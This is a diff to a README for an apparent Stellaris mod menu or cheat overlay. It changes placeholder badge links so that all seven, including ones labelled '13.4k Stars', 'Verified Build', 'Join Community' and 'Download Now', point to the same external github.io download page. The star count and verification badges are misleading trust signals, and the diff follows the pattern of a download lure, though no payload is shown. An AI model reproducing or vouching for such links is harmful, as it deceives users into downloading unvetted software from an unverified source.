@@ -24,10 +24,10 @@ The Mod Menu functions as a **real-time overlay UI**, designed to give players c
 
 ---
 
-[![Activate Mods](https://img.shields.io/badge/Activate-Mods-red?logo=rocket\&style=for-the-badge)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](#)
-[![⭐️ 13.4k Stars](https://img.shields.io/badge/Community-13.4k_Stars-green?logo=github\&style=for-the-badge)](#)
-[![Download Menu](https://img.shields.io/badge/Download-Now-brightgreen?logo=github\&style=for-the-badge)](#)
+[![Activate Mods](https://img.shields.io/badge/Activate-Mods-red?logo=rocket\&style=for-the-badge)](https://stellaris-mod-menu.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](https://stellaris-mod-menu.github.io/.github/)
+[![⭐️ 13.4k Stars](https://img.shields.io/badge/Community-13.4k_Stars-green?logo=github\&style=for-the-badge)](https://stellaris-mod-menu.github.io/.github/)
+[![Download Menu](https://img.shields.io/badge/Download-Now-brightgreen?logo=github\&style=for-the-badge)](https://stellaris-mod-menu.github.io/.github/)
 
 ---
 
@@ -174,8 +174,8 @@ A: Yes, disable the menu or reset configs.
 
 The **Stellaris Mod Menu** brings **resources, research, fleet control, and visuals** together in one simple UI. Whether you’re experimenting with new builds, testing endgame scenarios, or customizing the galaxy’s look, this menu lets you take control of your Stellaris experience.
 
-[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](#)
-[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](#)
-[![Download Mods](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](#)
+[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](https://stellaris-mod-menu.github.io/.github/)
+[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](https://stellaris-mod-menu.github.io/.github/)
+[![Download Mods](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](https://stellaris-mod-menu.github.io/.github/)
 
 ---
